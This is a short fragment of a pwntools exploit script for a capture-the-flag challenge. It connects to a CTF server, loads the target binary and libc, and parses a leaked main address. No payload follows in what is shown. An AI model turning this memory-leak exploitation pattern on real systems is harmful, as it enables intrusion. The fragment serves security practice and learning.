from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28215)
elf = ELF('./pwn') 
libc = ELF('/home/bit/libc/32bit/libc-2.27.so')
io.recvuntil("main addr is here :\n")
main = int(io.recvline(),16)
